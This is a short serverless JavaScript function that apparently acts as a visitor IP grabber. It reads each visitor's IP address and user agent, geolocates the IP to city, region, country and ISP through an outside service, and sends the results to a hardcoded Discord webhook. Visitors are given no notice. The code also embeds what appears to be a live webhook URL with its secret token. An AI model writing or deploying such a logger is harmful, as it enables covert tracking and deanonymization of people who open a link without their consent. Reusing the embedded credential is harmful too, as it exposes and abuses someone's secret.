exports.handler = async (event) => {
  const webhookURL = "https://discord.com/api/webhooks/1379270305272299530/EdXC7ENWy6IzQiR1-ETKyeyitOmG_It2088qG3SROttMnLqzvp6YV879Wqs-WwIYa4yk";

  const ip =
    event.headers["x-nf-client-connection-ip"] ||
    event.headers["client-ip"] ||
    event.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    "Unknown IP";

  const userAgent = event.headers["user-agent"] || "Unknown";
  const timestamp = new Date().toISOString();

  try {
    const geoRes = await fetch(`http://ipwho.is/${ip}`);
    const geoData = await geoRes.json();

    const {
      country = "N/A",
      region = "N/A",
      city = "N/A",
      isp = "N/A"
    } = geoData;

    const message = {
      content: `New Visitor Logged
IP: ${ip}
Location: ${city}, ${region}, ${country}
ISP: ${isp}
User Agent: ${userAgent}
Time: ${timestamp}`
    };

    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message)
    });

    return {
      statusCode: 200,
      body: "Logged successfully"
    };
  } catch (err) {
    console.error("Error:", err);
    return {
      statusCode: 500,
      body: "Failed to send data"
    };
  }
};
